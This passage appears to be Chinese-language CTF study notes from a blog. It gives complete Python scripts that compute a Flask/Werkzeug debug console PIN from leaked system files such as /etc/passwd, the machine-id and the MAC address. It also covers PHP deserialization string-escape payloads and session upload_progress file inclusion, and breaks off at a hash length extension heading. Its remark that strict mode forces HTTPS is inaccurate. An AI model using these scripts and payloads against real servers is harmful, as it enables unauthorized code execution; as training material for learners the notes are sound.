stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>username<br>通过getpass.getuser()读取，通过文件读取&#x2F;etc&#x2F;passwd<br>引用<br>modname<br>通过getattr(mod,“file”,None)读取，默认值为flask.app<br>引用<br>appname<br>通过getattr(app,“name”,type(app).name)读取，默认值为Flask<br>引用<br>moddir<br>当前网络的mac地址的十进制数，通过getattr(mod,“file”,None)读取实际应用中通过报错读取<br>引用<br>uuidnode<br>通过uuid.getnode()读取，通过文件&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address得到16进制结果，转化为10进制进行计算<br>引用<br>machine_id<br>每一个机器都会有自已唯一的id，machine_id由三个合并(docker就后两个)：</p>\n<p>1.&#x2F;etc&#x2F;machine-id (&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address)</p>\n<p>2.&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id </p>\n<p>3.&#x2F;proc&#x2F;self&#x2F;cgroup</p></blockquote>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><strong>不同版本算法区别</strong><br>3.6采用MD5加密，3.8采用sha1加密，所以脚本有所不同</p></blockquote>\n<h3 id=\"生成算法\"><a href=\"#生成算法\" class=\"headerlink\" title=\"生成算法\"></a>生成算法</h3><p>3.6 MD5</p>\n<pre class=\" language-highlight py\"><span class=\"comment\"><code class=\"language-highlight py\"><span class=\"comment\">#MD5</span>\n<span class=\"keyword\">import</span> hashlib\n<span class=\"keyword\">from</span> itertools <span class=\"keyword\">import</span> chain\nprobably_public_bits = [\n     <span class=\"string\">&#x27;flaskweb&#x27;</span>\n     <span class=\"string\">&#x27;flask.app&#x27;</span>,\n     <span class=\"string\">&#x27;Flask&#x27;</span>,\n     <span class=\"string\">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>\n]\n​\nprivate_bits = [\n     <span class=\"string\">&#x27;25214234362297&#x27;</span>,\n     <span class=\"string\">&#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;</span>\n]\n​\nh = hashlib.md5()\n<span class=\"keyword\">for</span> bit <span class=\"keyword\">in</span> chain(probably_public_bits, private_bits):\n    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> bit:\n        <span class=\"keyword\">continue</span>\n    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(bit, <span class=\"built_in\">str</span>):\n        bit = bit.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>)\n    h.update(bit)\nh.update(<span class=\"string\">b&#x27;cookiesalt&#x27;</span>)\n​\ncookie_name = <span class=\"string\">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class=\"number\">20</span>]\n​\nnum = <span class=\"literal\">None</span>\n<span class=\"keyword\">if</span> num <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:\n   h.update(<span class=\"string\">b&#x27;pinsalt&#x27;</span>)\n   num = (<span class=\"string\">&#x27;%09d&#x27;</span> % <span class=\"built_in\">int</span>(h.hexdigest(), <span class=\"number\">16</span>))[:<span class=\"number\">9</span>]\n​\nrv =<span class=\"literal\">None</span>\n<span class=\"keyword\">if</span> rv <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:\n   <span class=\"keyword\">for</span> group_size <span class=\"keyword\">in</span> <span class=\"number\">5</span>, <span class=\"number\">4</span>, <span class=\"number\">3</span>:\n       <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(num) % group_size == <span class=\"number\">0</span>:\n          rv = <span class=\"string\">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class=\"string\">&#x27;0&#x27;</span>)\n                      <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(num), group_size))\n          <span class=\"keyword\">break</span>\n       <span class=\"keyword\">else</span>:\n          rv = num\n​\n<span class=\"built_in\">print</span>(rv)</code></pre>\n\n<p>3.8 SHA-1</p>\n<pre class=\" language-highlight py\"><span class=\"comment\"><code class=\"language-highlight py\"><span class=\"comment\">#sha1</span>\n<span class=\"keyword\">import</span> hashlib\n<span class=\"keyword\">from</span> itertools <span class=\"keyword\">import</span> chain\nprobably_public_bits = [\n    <span class=\"string\">&#x27;root&#x27;</span>\n    <span class=\"string\">&#x27;flask.app&#x27;</span>,\n    <span class=\"string\">&#x27;Flask&#x27;</span>,\n    <span class=\"string\">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span>\n]\n​\nprivate_bits = [\n    <span class=\"string\">&#x27;2485377581187&#x27;</span>,\n    <span class=\"string\">&#x27;653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd&#x27;</span>\n]\n​\nh = hashlib.sha1()\n<span class=\"keyword\">for</span> bit <span class=\"keyword\">in</span> chain(probably_public_bits, private_bits):\n    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> bit:\n        <span class=\"keyword\">continue</span>\n    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(bit, <span class=\"built_in\">str</span>):\n        bit = bit.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>)\n    h.update(bit)\nh.update(<span class=\"string\">b&#x27;cookiesalt&#x27;</span>)\n​\ncookie_name = <span class=\"string\">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class=\"number\">20</span>]\n​\nnum = <span class=\"literal\">None</span>\n<span class=\"keyword\">if</span> num <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:\n    h.update(<span class=\"string\">b&#x27;pinsalt&#x27;</span>)\n    num = (<span class=\"string\">&#x27;%09d&#x27;</span> % <span class=\"built_in\">int</span>(h.hexdigest(), <span class=\"number\">16</span>))[:<span class=\"number\">9</span>]\n​\nrv =<span class=\"literal\">None</span>\n<span class=\"keyword\">if</span> rv <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:\n    <span class=\"keyword\">for</span> group_size <span class=\"keyword\">in</span> <span class=\"number\">5</span>, <span class=\"number\">4</span>, <span class=\"number\">3</span>:\n        <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(num) % group_size == <span class=\"number\">0</span>:\n            rv = <span class=\"string\">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class=\"string\">&#x27;0&#x27;</span>)\n                          <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(num), group_size))\n            <span class=\"keyword\">break</span>\n    <span class=\"keyword\">else</span>:\n        rv = num\n​\n<span class=\"built_in\">print</span>(rv)</code></pre>\n\n<h1 id=\"反序列化逃逸\"><a href=\"#反序列化逃逸\" class=\"headerlink\" title=\"反序列化逃逸\"></a>反序列化逃逸</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>变短吸收后面，变长挤掉后面</p>\n<p>s:5:”12345”中</p>\n<p>5是说明也是限制，后面的5个字符都属于字符串</p>\n<p>s:5:”1234””中</p>\n<p>1234”也算是字符串，”不起闭合作用</p>\n<ol>\n<li><p>如变长</p>\n<blockquote>\n<p>x-&gt;yy</p>\n<p>s:6:”xxxxxx”</p>\n<p>filter后</p>\n<p>s:6:”yyyyyyyyyyyy”(反序列化会报错)</p></blockquote>\n<p>所以修改一下filter前的</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>s:6:”xxx”;}”</p>\n<p>其中字符串为xxx”;} 这6个，但是当x-&gt;yy后，xxx变长为6位xxxxxx</p>\n<p>s:6:”yyyyyy”;}”</p>\n<p>字符串就为yyyyyy了，<code>&quot;;&#125;</code>就实现了成功逃逸，将语句闭合，当然逃逸数据可以修改，长度刚好为变长部分长度</p></blockquote>\n</li>\n<li><p>如变短</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>xx-&gt;y</p>\n<p>s:6:”xxxxxx”;}O:5</p>\n<p>filter后</p>\n<p>s:6:”yyy”;}O:5(反序列化会报错)</p></blockquote>\n<p>所以修改一下filter前的</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>s:18:”<code>xxxxxxxxxxxxxxxxxx</code>“;s:23:”<code>a&quot;;&#125;O:4:&#123;s:5:&quot;hacker&quot;;&#125;</code>“;}O:5</p>\n<p>其中字符串为这16个，但是当xx-&gt;y后，xxxxxxxxxxxxxxxxxx变短为9位xxxxxxxxx</p>\n<p>s:18:”<code>yyyyyyyyy&quot;;s:23:&quot;a</code>“;}O:4:{s:4:”hacker”;}”;}O:5</p>\n<p>字符串就为<code>yyyyyyyyy&quot;;s:23:&quot;a</code>了，</p>\n<p>而;}就将其闭合了，而后<code>O:4:&#123;s:5:&quot;hacker&quot;;&#125;</code>就逃出来了</p>\n<p>变短就是数一下后面需要吞掉截断的字符串到其最后一个引号的字符个数，要是filter数据长度的一半</p></blockquote>\n</li>\n</ol>\n</blockquote>\n<h1 id=\"session进行文件包含\"><a href=\"#session进行文件包含\" class=\"headerlink\" title=\"session进行文件包含\"></a>session进行文件包含</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><code>session包含需要session打开，没打开怎么办，页面没有session</code></p></blockquote>\n<h2 id=\"session-upload-progress作用？\"><a href=\"#session-upload-progress作用？\" class=\"headerlink\" title=\"session.upload_progress作用？\"></a><code>session.upload_progress</code>作用？</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><code>session.upload_progress.enabled</code> &#x3D; <strong>on</strong></p>\n<p><code>session.upload_progress.cleanup</code> &#x3D; <strong>on</strong></p>\n<p><code>session.upload_progress.prefix</code> &#x3D; “<strong>upload_progress_</strong>“</p>\n<p><code>session.upload_progress.name</code> &#x3D; “<strong>PHP_SESSION_UPLOAD_PROGRESS</strong>“</p></blockquote>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><code>session.upload_progress.enabled</code>可以控制是否开启session.upload_progress功能</p>\n<p><code>session.upload_progress.cleanup</code>可以控制是否在上传之后删除文件内容</p>\n<p><code>session.upload_progress.prefix</code>可以设置上传文件内容的前缀</p>\n<p><code>session.upload_progress.name</code>的值即为session中的键值</p></blockquote>\n<p>session.upload_progress开启之后，此时我们再往服务器中上传一个文件时，PHP会把该文件的详细信息(如上传时间、上传</p>\n<p>进度等)存储在session当中。</p>\n<p><strong>初始化session</strong></p>\n<p><code>session.use_strict_mode</code>是一个PHP配置选项，它指定了在使用cookie存储会话ID时是否启用严格模式。当启用严格模式时，会话</p>\n<p>ID只能通过HTTPS连接传输，并且不能通过URL参数传递。这可以防止会话劫持攻击。如果未启用严格模式，则会话ID可以通过HTTP连</p>\n<p>接传输，并且可以通过URL参数传递。这可能会导致会话劫持攻击。默认情况下，<code>session.use_strict_mode</code>设置为0（禁用）</p>\n<h1 id=\"hash长度扩展攻击\"><a href=\"#hash长度扩展攻击\" class=\"headerlink\" title=\"hash长度扩展攻击\"></a>hash长度扩展攻击</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 